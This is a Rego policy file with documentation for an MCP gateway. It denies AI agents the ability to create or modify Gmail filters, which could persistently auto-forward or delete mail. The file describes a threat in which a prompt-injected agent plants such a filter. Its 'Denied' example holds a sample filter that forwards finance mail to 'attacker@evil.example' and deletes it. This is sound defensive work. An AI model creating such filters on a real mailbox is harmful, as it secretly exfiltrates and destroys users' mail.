---
name: Block Gmail Filter Creation (Auto-Forward Persistence)
tags:
  - gmail
  - guard-mailbox-persistence
  - ingress
  - bec
  - finserv-comms
  - soc2
publishedAt: 2026-07-12
description: |
  # gmail / guard-mailbox-persistence

  **Direction:** ingress (`tool_pre_invoke`)
  **Default:** deny on match, allow otherwise
  **Package:** `gmail.ingress.guard_mailbox_persistence`

  ## What it does

  Blocks the classic BEC/exfiltration persistence primitive: Gmail filters
  that can auto-forward or auto-delete mail and outlive the agent session.
  A compromised or prompt-injected agent that creates one malicious filter
  keeps exfiltrating (or destroying) mail long after the session ends —
  invisible to the user until they audit their filter list.

  Concretely, the policy:

  - **Denies all filter creation** — `create_filter` and
    `create_filter_from_template` (GongRzhe Gmail-MCP-Server), which take
    `criteria` + `action` objects capable of expressing forward-and-delete
    rules.
  - **Restricts `manage_gmail_filter`** (taylorwilsdon google_workspace_mcp,
    a single tool multiplexing filter CRUD via an `action` argument) to the
    read-only actions `"list"` and `"get"`. Any other action — `create`,
    `update`, `delete`, or anything unrecognized — is denied.
  - **Fails closed** for `manage_gmail_filter` when the `action` argument is
    missing or not a string: an unclassifiable filter mutation is exactly the
    drift this policy exists to stop.
  - **Passes filter reads untouched** — `list_filters`, `get_filter`
    (GongRzhe) and `list_gmail_filters` (taylorwilsdon) are dedicated
    read-only tools and are not matched.

  There is **no group exemption by default** — filter management belongs in
  the Gmail admin UI, not in an agent session, and the deny reason says so
  with an escalation hint.

  ## Compliance alignment

  - **SOC 2 CC6.7** — supports the restriction on transmission/movement of
    information: a Gmail filter with an auto-forward action silently relays
    inbound mail outside the organization's boundary, so blocking agent-side
    filter creation closes that unattended exfiltration channel on the MCP
    path.
  - **SOC 2 PI1.5** — supports integrity of stored records: a filter with a
    delete action destroys inbound messages prospectively; denying agent-side
    filter creation keeps the mailbox record set intact.
  - **SEC 17a-4(b) / FINRA 4511(c)** — record integrity / anti-destruction:
    a Gmail filter with a delete action destroys inbound records
    prospectively and silently; blocking agent-side filter creation supports
    keeping the mailbox record set intact on the MCP path (coverage matrix
    §2.6, family PF-17, coverage **E**).

  This policy carries the **`soc2`** framework bundle (CC6.7 / PI1.5, above).
  Beyond that, the coverage matrix also maps the `guard-mailbox-persistence`
  family to SEC 17a-4 / FINRA 4511 (finserv record-integrity), which sits
  outside the five launch bundles — import it directly where BEC persistence
  or finserv record-integrity risk is in scope.

  ## Tool name matching

  The DTwo gateway prefixes tool names with the configured MCP server name
  (e.g. `gmail-mcp-create_filter`), and that prefix is not standardized, so
  the policy matches on the suffix:

  - `*create_filter` / `*create-filter` — denied
  - `*create_filter_from_template` / `*create-filter-from-template` — denied
  - `*manage_gmail_filter` / `*manage-gmail-filter` — denied unless
    `action` is `"list"` or `"get"`

  Hyphenated variants are matched defensively in case a server or gateway
  normalizes underscores. Matching is case-insensitive. Verify the exact
  names your gateway sends with the dump-input debug technique before
  relying on this in production.

  ## Argument shape

  Only `manage_gmail_filter` has its arguments inspected:

  - `input.payload.args.action` — string; `"list"` and `"get"`
    (case-insensitive) are the only values allowed through. Read via
    `object.get`, so a missing key, a non-string value, or a missing/
    malformed `args` object all fall through to the default deny
    (fail closed).

  `create_filter` / `create_filter_from_template` are denied at the tool
  level regardless of arguments, so their `criteria` / `action` sub-fields
  are never inspected.

  ## Examples

  ### Allowed — dedicated filter read

  ```jsonc
  {
    "input": {
      "action": "tool_pre_invoke",
      "resource": { "name": "gmail-mcp-list_filters", "type": "tool" },
      "payload": { "name": "gmail-mcp-list_filters", "args": {} }
    }
  }
  ```

  `allow = true`, no reason.

  ### Allowed — read-only action on the manage tool

  ```jsonc
  {
    "input": {
      "action": "tool_pre_invoke",
      "resource": { "name": "workspace-mcp-manage_gmail_filter", "type": "tool" },
      "payload": {
        "name": "workspace-mcp-manage_gmail_filter",
        "args": { "user_google_email": "user@example.com", "action": "list" }
      }
    }
  }
  ```

  `allow = true`, no reason.

  ### Denied — filter creation

  ```jsonc
  {
    "input": {
      "action": "tool_pre_invoke",
      "resource": { "name": "gmail-mcp-create_filter", "type": "tool" },
      "payload": {
        "name": "gmail-mcp-create_filter",
        "args": {
          "criteria": { "from": "finance@example.com" },
          "action": { "forward": "attacker@evil.example", "delete": true }
        }
      }
    }
  }
  ```

  `allow = false`, `reason = "Creating Gmail filters through the agent is blocked (...)"`.

  ## Composition

  This policy is single-purpose: it guards the filter *mutation* surface.
  Useful companions:

  - **`apps/gmail/freeze-destructive-ops`** — owns denial of the dedicated
    destructive tools, including `delete_filter` and the permanent
    `delete_email` / `batch_delete_emails`. (This policy still denies
    `manage_gmail_filter` with `action: "delete"`, since any non-read action
    on that tool is a filter mutation — the overlap is deliberate
    defense in depth.)
  - A Gmail external-send guard (family `guard-external-send`) — filters are
    the *persistent* forwarding channel; direct `send_email` /
    `send_gmail_message` calls are the immediate one.

  ## Known limitations

  - **`criteria` / `action` sub-field names are unverified** per the Gmail
    landscape note (GongRzhe's README documents the objects but not their
    exact sub-fields). This does not weaken enforcement — creation is denied
    at the tool level without inspecting those objects — but it is why the
    policy makes no attempt to allow "harmless" filters selectively.
  - **`delete_filter` is not matched here** — its denial is owned by the
    companion `freeze-destructive-ops` policy. Deploy both. (This policy
    intentionally passes `delete_filter` through — do not read that as
    permission; it is scope delegation.)
  - **The `action` dispatch key and the `get` read value are inferred from
    the landscape note, not fully verified.** The note attests
    `manage_gmail_filter`'s `action` values `"list"` and `"delete"`; this
    policy also treats `"get"` as read-only (retrieving one filter is no more
    sensitive than `list_gmail_filters`), which is marginally more permissive
    than the coverage-matrix PF-17 candidate's `list`-only allowance
    (§2.6). Both allowed values are reads, so this is not a mutation bypass.
    Critically, if a server dispatches on a different key than `action`, or
    uses a different read value, the `object.get(args, "action", "")` chain
    yields `""` and the manage tool fails **closed** (denied) — the inference
    can only ever over-block, never leak.
  - **The official Google/Claude Gmail connector exposes no filter tools at
    all** — on that surface this policy is a no-op. It protects tenants
    running community servers (GongRzhe, taylorwilsdon), where the filter
    surface silently appears when a tenant switches connectors.
  - **No webhook/subscription surface** — none of the three surveyed Gmail
    MCP servers exposes Gmail `watch`/Pub/Sub subscriptions; the
    `guard-mailbox-persistence` family covers that vector on M365
    (`create-mail-rule`, `create-subscription`) instead.
  - **No identity-based exemption by default** — deliberate, as filter
    management belongs in the Gmail admin UI. If your organization needs a
    break-glass group, add a separate `allow if` branch gated on
    `input.subject.claims.groups`; group names there would be placeholders —
    replace them with your IdP's group names at import time.
  - **Suffix matching is a portability trade-off** — a server exposing filter
    creation under an entirely different name (not ending in the suffixes
    above) would not be matched. Pair with a `default-deny-unknown-tools`
    allowlist policy where tool-name drift is a concern.

  > **Compliance note.** This policy supports alignment with the cited framework controls **on the MCP path only**. No policy or bundle makes an organization compliant with any framework; web-UI, native-API, and in-app access are outside the gateway's reach by design. Validate against your own compliance program before relying on it.
direction: ingress
apps:
  - gmail
industries: []
bundles:
  - soc2
experimental: true
schemaVersion: 1.0.0
minimumGatewayVersion: 1.0.0b24
---

```rego
package gmail.ingress.guard_mailbox_persistence

# Deny-by-default: only the explicit allow rules below permit the request.
default allow := false

# Gmail filter-creation tools (GongRzhe Gmail-MCP-Server): create_filter and
# create_filter_from_template take criteria + action objects that can express
# auto-forward / auto-delete rules — the classic BEC persistence primitive.
# The gateway prefixes tool names with the configured MCP server name, so we
# match on the suffix to stay portable; hyphenated variants are included in
# case a server or gateway normalizes underscores. Verify the exact names on
# your gateway with the dump-input debug technique.
filter_create_suffixes := {
    "create_filter",
    "create-filter",
    "create_filter_from_template",
    "create-filter-from-template",
}

is_filter_create_tool if {
    name := lower(input.resource.name)
    some suffix in filter_create_suffixes
    endswith(name, suffix)
}

# taylorwilsdon google_workspace_mcp multiplexes filter CRUD through a single
# manage_gmail_filter tool selected by an `action` argument.
filter_manage_suffixes := {
    "manage_gmail_filter",
    "manage-gmail-filter",
}

is_filter_manage_tool if {
    name := lower(input.resource.name)
    some suffix in filter_manage_suffixes
    endswith(name, suffix)
}

# Read-only actions permitted on the manage tool. Everything else — create,
# update, delete, or anything unrecognized — is a filter mutation.
filter_read_actions := {"list", "get"}

# Safe argument access: a missing payload or args never raises, it just
# yields an empty object and the checks below fall through to the deny.
args := object.get(object.get(input, "payload", {}), "args", {})

manage_action := object.get(args, "action", "")

# The manage call is read-only iff `action` is a string equal to list/get.
# A missing or non-string `action` fails this rule, so an unclassifiable
# filter mutation falls through to the default deny (fail closed) — that
# drift is exactly what this policy exists to stop.
manage_action_is_read if {
    is_string(manage_action)
    lower(manage_action) in filter_read_actions
}

# Any tool that is not a filter-mutation surface passes untouched, including
# the dedicated filter reads (list_filters, get_filter, list_gmail_filters).
allow if {
    not is_filter_create_tool
    not is_filter_manage_tool
}

# The multiplexed manage tool is allowed only for read-only actions.
allow if {
    is_filter_manage_tool
    manage_action_is_read
}

reasons contains "Creating Gmail filters through the agent is blocked: a filter can silently auto-forward or auto-delete mail and persists after this session ends. Manage filters in the Gmail settings UI instead. If a filter is legitimately needed, ask your InfoSec team to review this request." if {
    is_filter_create_tool
}

reasons contains "This Gmail filter management call is blocked: only the read-only actions 'list' and 'get' are allowed, because filter changes can silently auto-forward or auto-delete mail and persist after this session ends. Manage filters in the Gmail settings UI instead. If a filter change is legitimately needed, ask your InfoSec team to review this request." if {
    is_filter_manage_tool
    not manage_action_is_read
}

reason := joined if {
    count(reasons) > 0
    reason_list := sort([r | some r in reasons])
    joined := concat("; ", reason_list)
}
```
